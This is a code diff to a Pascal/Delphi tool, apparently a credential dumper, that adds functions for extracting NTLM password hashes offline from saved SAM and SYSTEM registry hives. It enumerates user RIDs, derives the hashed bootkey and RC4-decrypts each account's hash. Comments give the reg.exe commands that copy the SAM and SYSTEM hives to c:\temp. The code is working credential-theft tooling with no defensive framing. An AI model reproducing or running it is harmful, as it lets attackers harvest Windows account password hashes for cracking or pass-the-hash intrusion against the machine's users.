@@ -105,6 +105,7 @@ for i:=0 to length(keys)-1 do
     end;
 end;
 
+//reg.exe save hklm\system c:\temp\system.sav
 //also known as bootkey
 function getsyskey(var output:tbyte16):boolean;
 const
@@ -183,6 +184,48 @@ begin
 end;
 
 //also known as hashed bootkey
+function getsamkey_offline(syskey:tbyte16;var output:tbyte16):boolean;
+var
+  ret:word;
+  hkey,hkresult:thandle;
+  data:array[0..1023] of byte;
+  salt:tbyte16;
+  encrypted_samkey:array[0..31] of byte;
+  //bytes:array[0..15] of byte;
+  ptr:pointer;
+  cbdata:integer;
+begin
+result:=false;
+
+uofflinereg.init ;
+ret:=OROpenHive(pwidechar(widestring('sam.sav')),hkey);
+if ret<>0 then begin log('OROpenHive NOT OK',0);exit;end;
+ret:=OROpenKey (hkey,pwidechar(widestring('sam\Domains\account')),hkresult);
+if ret<>0 then begin log('OROpenKey NOT OK',0);exit;end;
+
+
+cbdata:=getvaluePTR (hkresult,'F',ptr);
+if cbdata<=0 then begin log('getvaluePTR NOT OK',0);exit;end;
+copymemory(@data[0],ptr,cbdata);
+     {
+     //we should cover AES/DES on new "ntlm", based on the first byte of F
+     //if F[0]=3 then ...
+     hBootIV = HexRegSysk[0x78*2:(0x78+16)*2] ## 16 Bytes iv
+     encSysk = HexRegSysk[0x88*2:(0x88+32)*2][:32] ## Only 16 bytes needed
+     Syskey = decryptAES(encSysk, hBootkey, hBootIV)
+     }
+     log('getvaluePTR OK '+inttostr(cbdata)+' read',0);
+     CopyMemory(@salt[0],@data[$70],sizeof(salt)) ;
+     CopyMemory(@encrypted_samkey[0],@data[$80],sizeof(tbyte16)) ;
+     //writeln('SAMKey:'+HashByteToString (samkey));
+     result:= gethashedbootkeyRC4(salt,syskey,encrypted_samkey,tbyte16(output)); //=true then writeln('SAMKey:'+HashByteToString (tbyte16(bytes)));
+
+     ret:=ORcloseKey (hkresult);
+     ret:=ORCloseHive (hkey);
+
+end;
+
+//also known as hashed bootkey
 function getsamkey(syskey:tbyte16;var output:tbyte16):boolean;
 var
   ret:long;
@@ -194,6 +237,11 @@ var
   //bytes:array[0..15] of byte;
 begin
 result:=false;
+if offline=true then
+   begin
+   result:=getsamkey_offline(syskey,output);
+   exit;
+   end;
 //only if run as system
 //ret := RegCreateKeyEx(HKEY_LOCAL_MACHINE ,pchar('SAM\sam\Domains\account'),0,nil,REG_OPTION_NON_VOLATILE,KEY_READ,nil,topKey,@dwDisposition);
 ret:=RegOpenKeyEx(HKEY_LOCAL_MACHINE, 'SAM\sam\Domains\account',0, KEY_READ, topkey);
@@ -224,6 +272,8 @@ if ret=0 then
   else log('RegOpenKeyEx NOT OK:'+inttostr(ret),0);
 RegCloseKey(topkey);
 end;
+
+
 
 function decrypthashRC4(samkey:array of byte;var hash:tbyte16;rid_:dword):boolean;
 const
@@ -279,6 +329,59 @@ end;
 
 //reg.exe save hklm\sam c:\temp\sam.save
 //see https://www.insecurity.be/blog/2018/01/21/retrieving-ntlm-hashes-and-what-changed-technical-writeup/
+function dumphash_offline(samkey:tbyte16;rid:dword;var output:tbyte16;var username:string):boolean;
+var
+  ret:word;
+  hkey,hkresult:thandle;
+  cbdata:integer;
+  data:array[0..1023] of byte;
+  //hash:tbyte16;
+  offset,name_offset,name_length:dword;
+  name:pwidechar;
+  ptr:pointer;
+begin
+result:=false;
+
+uofflinereg.init ;
+ret:=OROpenHive(pwidechar(widestring('sam.sav')),hkey);
+if ret<>0 then begin log('OROpenHive NOT OK',0);exit;end;
+ret:=OROpenKey (hkey,pwidechar(widestring('sam\Domains\account\users\'+inttohex(rid,8))),hkresult);
+if ret<>0 then begin log('OROpenKey NOT OK',0);exit;end;
+
+
+cbdata:=getvaluePTR (hkresult,'V',ptr);
+if cbdata<=0 then begin log('getvaluePTR NOT OK',0);exit;end;
+copymemory(@data[0],ptr,cbdata);
+
+     log('getvaluePTR OK '+inttostr(cbdata)+' read',0);
+     //we should check the length 0x14=rc4 / 0x38=aes
+     //see https://github.com/tijldeneut/Security/blob/master/DumpSomeHashes/DumpSomeHashesAuto.py
+     {
+     if hex(Length)=='0x38': ## AES Encrypted Hash
+     EncryptedHash = decryptAES(Hash, Syskey, IV)
+     }
+     //username
+     copymemory(@name_offset,@data[$0C],sizeof(name_offset));
+     name_offset := name_offset + $CC;
+     copymemory(@name_length,@data[$10],sizeof(name_length));
+     copymemory(@offset,@data[$A8],sizeof(offset));
+     name:=allocmem(name_length);
+     CopyMemory(name,@data[name_offset],name_length );
+     username:=name;
+     //
+     offset:=offset+$CC+4; //the first 4 bytes are a header (revision, etc?)
+     log('Offset:'+inttohex(offset,4),0);
+     CopyMemory(@output[0],@data[offset],sizeof(output)) ;
+     log('Encrypted Hash:'+HashByteToString (output),0);
+     result:=decrypthashRC4(samkey ,output,rid);
+
+     ret:=ORcloseKey (hkresult);
+     ret:=ORCloseHive (hkey);
+
+end;
+
+//reg.exe save hklm\sam c:\temp\sam.save
+//see https://www.insecurity.be/blog/2018/01/21/retrieving-ntlm-hashes-and-what-changed-technical-writeup/
 function dumphash(samkey:tbyte16;rid:dword;var output:tbyte16;var username:string):boolean;
 var
   ret:long;
@@ -290,6 +393,11 @@ var
   name:pwidechar;
 begin
 result:=false;
+if offline=true then
+            begin
+            result:=dumphash_offline(samkey,rid,output,username);
+            exit;
+            end;
 //only if run as system
 //ret := RegCreateKeyEx(HKEY_LOCAL_MACHINE ,pchar('SAM\sam\Domains\account'),0,nil,REG_OPTION_NON_VOLATILE,KEY_READ,nil,topKey,@dwDisposition);
 ret:=RegOpenKeyEx(HKEY_LOCAL_MACHINE, pchar('SAM\sam\Domains\account\users\'+inttohex(rid,8)),0, KEY_READ, topkey);
@@ -328,6 +436,54 @@ if ret=0 then
 RegCloseKey(topkey);
 end;
 
+function query_samusers_offline(samkey:tbyte16;func:pointer =nil):boolean;
+const
+  MAX_KEY_LENGTH =255;
+  MAX_VALUE_NAME =16383;
+var
+  ret:word;
+  hkey,hkresult:thandle;
+  i:byte;
+  retcode,cbname:dword;
+  achKey:array[0..MAX_KEY_LENGTH-1] of widechar;
+  ftLastWriteTime:filetime;
+  param:tsamuser;
+begin
+result:=false;
+
+uofflinereg.init ;
+ret:=OROpenHive(pwidechar(widestring('sam.sav')),hkey);
+if ret<>0 then begin log('OROpenHive NOT OK',0);exit;end;
+ret:=OROpenKey (hkey,pwidechar(widestring('sam\Domains\account\users')),hkresult);
+if ret<>0 then begin log('OROpenKey NOT OK',0);exit;end;
+
+
+result:=true;
+for i:=0 to 254 do
+  begin
+            cbName := MAX_KEY_LENGTH;
+            ret:=OREnumKey(hkresult,
+                                i,
+                                @achKey[0],
+                                @cbName,
+                                nil,
+                                nil,
+                                @ftLastWriteTime);
+
+            if (ret <>ERROR_SUCCESS) then break;
+            if (lowercase(strpas(achKey)))='names' then break;
+            if func=nil then log( strpas(achKey)+' '+inttostr(strtoint('$'+strpas(achKey))),1);
+            if func<>nil then
+               begin
+               param.samkey :=samkey;
+               param.rid :=strtoint('$'+strpas(achKey));
+               fn(func)(@param );
+
+               end;
+end;
+
+end;
+
 function query_samusers(samkey:tbyte16;func:pointer =nil):boolean;
 const
   MAX_KEY_LENGTH =255;
@@ -339,8 +495,16 @@ var i:byte;
   hKey:thandle;
   param:tsamuser;
 begin
+result:=false;
+if offline=true then
+                begin
+                result:=query_samusers_offline(samkey,func);
+                exit;
+                end;
+
 retcode:=RegOpenKeyEx(HKEY_LOCAL_MACHINE, pchar('SAM\sam\Domains\account\users'),0, KEY_READ, hKey);
 if retcode<>0 then begin log('RegOpenKeyEx NOT OK',0);exit;end;
+result:=true;
 for i:=0 to 254 do
   begin
             cbName := MAX_KEY_LENGTH;
